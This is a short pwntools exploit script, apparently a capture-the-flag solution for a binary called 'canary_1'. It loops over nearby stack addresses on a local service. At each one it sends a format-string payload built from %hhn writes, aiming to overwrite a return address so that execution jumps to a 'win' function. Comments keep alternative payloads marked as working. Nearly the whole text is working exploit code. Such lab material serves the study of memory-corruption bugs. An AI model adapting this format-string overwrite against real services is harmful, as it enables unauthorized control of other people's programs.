from pwn import *

#x86_64, Linux, Little Endian
context.os = "linux"
context.endian = "little"
context.arch = "amd64"

elf = ELF("../canary_1", checksec=False)
win = elf.symbols["win"]

# ret address of main is 4014c9
# win is at 401246
# only two bytes can be written

host = "localhost"
port = 10000

target = 0x00007fffffffde28
interval = 8*2

for addr in range(target - interval, target + interval, 8):

    conn = remote(host, port)
    print("Trying address {} ...".format(hex(addr)))
    payload = b"%70c" + b"%11$hhn" + b"%204c" + b"%12$hhn" b"%46c" + b"%13$hhn" + b"A"*6 + p64(addr) + p64(addr+1) + p64(addr+2)
    # payload = b"%70c" + b"%9$hhn" + b"%204c" + b"%10$hhn" + b"AA" + p64(addr) + p64(addr+1) # WORKING
    # writes = {addr : win}
    # payload = fmtstr_payload(offset=6, numbwritten=0, writes=writes, write_size='short', overflows=5) # ALSO WORKING
    print(payload)
    conn.sendline(payload) 
    try:
        print(conn.recvuntil("You win"))
        break
    except:
        continue

